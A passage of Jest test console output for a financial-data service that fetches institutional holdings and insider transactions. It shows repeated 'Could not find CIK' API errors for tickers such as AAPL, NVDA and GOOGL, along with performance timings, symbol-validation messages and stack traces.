      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:155:22)

  console.log
    [2025-09-21T23:25:31.896Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 45ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 45,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:31.950Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:32.009Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 2
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:165:24)

  console.log
    [2025-09-21T23:25:32.010Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 60ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 60,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ⚠ No institutional holdings found for AAPL - this may be due to data availability or API limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:195:17)

  console.log
    [2025-09-21T23:25:32.063Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:32.109Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol TSLA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "TSLA",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:202:28)

  console.log
    [2025-09-21T23:25:32.110Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 47ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 47,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ⚠ No insider transactions found for TSLA - this may be due to data availability or API limitations

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:236:17)

  console.log
    [2025-09-21T23:25:32.163Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalIntelligence
    Metadata: {
      "timeout": 45000,
      "retries": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.164Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.164Z] DEBUG [InstitutionalDataService] Starting API call: getInsiderTransactions
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:32.242Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol NVDA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "NVDA",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:243:28)

  console.log
    [2025-09-21T23:25:32.243Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 79ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 79,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:32.398Z] ERROR [InstitutionalDataService] API Error: GET insider_transactions - Could not find CIK for symbol NVDA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "insider_transactions",
      "error": {},
      "symbol": "NVDA",
      "days": 180
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInsiderTransactions (app/services/financial-data/InstitutionalDataService.ts:267:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at InstitutionalDataService.executeGetInstitutionalIntelligence (app/services/financial-data/InstitutionalDataService.ts:283:40)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:243:28)

  console.log
    [2025-09-21T23:25:32.399Z] DEBUG [InstitutionalDataService] Performance: getInsiderTransactions completed in 235ms
    Metadata: {
      "type": "performance",
      "operation": "getInsiderTransactions",
      "duration": 235,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.log
    [2025-09-21T23:25:32.400Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalIntelligence completed in 237ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalIntelligence",
      "duration": 237,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    ✓ Generated institutional intelligence for NVDA:

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:277:17)

  console.log
      Composite Score: 5/10

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:278:17)

  console.log
      Weighted Sentiment: NEUTRAL

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:279:17)

  console.log
      Key Insights: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:280:17)

  console.log
      Risk Factors: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:281:17)

  console.log
      Opportunities: 0

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:282:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:32.531Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:32.534Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:313:22)

  console.log
    [2025-09-21T23:25:32.535Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 4ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 4,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.593Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.594Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.594Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.594Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:32.594Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:32.635Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:326:23)

  console.log
    [2025-09-21T23:25:32.636Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 43ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 43,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:32.830Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:326:23)

  console.log
    [2025-09-21T23:25:32.831Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 237ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 237,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:32.978Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:326:23)

  console.log
    [2025-09-21T23:25:32.978Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 384ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 384,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.error
    [2025-09-21T23:25:33.131Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 3)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:326:23)

  console.log
    [2025-09-21T23:25:33.132Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 538ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 538,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 3)

  console.error
    [2025-09-21T23:25:33.384Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol V
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "V",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 4)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:326:23)

  console.log
    [2025-09-21T23:25:33.385Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 791ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 791,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 4)

  console.log
    [2025-09-21T23:25:33.451Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:33.454Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 3ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 3,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:33.514Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:33.580Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:376:7)

  console.log
    [2025-09-21T23:25:33.580Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 66ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 66,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.info
    [InstitutionalDataService] VALIDATION_ERROR: Invalid symbol: Invalid symbol format - must be 1-5 uppercase letters/numbers, Symbol too long, Invalid symbol format - must be 1-5 uppercase letters/numbers

      at ErrorHandler.logError (app/services/error-handling/ErrorHandler.ts:585:17)

  console.log
    [2025-09-21T23:25:33.581Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:33.807Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:382:28)

  console.log
    [2025-09-21T23:25:33.808Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 227ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 227,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:33.874Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:34.017Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:393:25)

  console.log
    [2025-09-21T23:25:34.018Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 144ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 144,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.018Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:34.306Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:398:25)

  console.log
    [2025-09-21T23:25:34.308Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 290ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 290,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.382Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:34.489Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
